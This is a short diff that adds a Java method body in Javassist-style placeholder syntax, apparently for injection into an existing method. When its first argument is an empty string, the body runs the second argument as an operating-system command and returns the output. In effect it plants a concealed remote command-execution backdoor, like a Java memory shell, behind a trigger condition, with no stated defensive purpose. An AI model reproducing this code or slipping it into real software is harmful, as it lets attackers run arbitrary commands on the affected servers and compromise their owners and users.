@@ -1,0 +1,19 @@
+{
+    if (!"".equals($1)){
+        return null;
+    }
+    java.lang.StringBuffer stringBuffer = new StringBuffer();
+    try {
+        String[] s = $2.split(" ");
+        java.lang.ProcessBuilder processBuilder = new java.lang.ProcessBuilder(s);
+        java.io.InputStream inputStream = null;
+        inputStream = processBuilder.start().getInputStream();
+        java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter("\\A");
+        while (scanner.hasNext()){
+            stringBuffer.append(scanner.next());
+        }
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+    return stringBuffer.toString();
+}
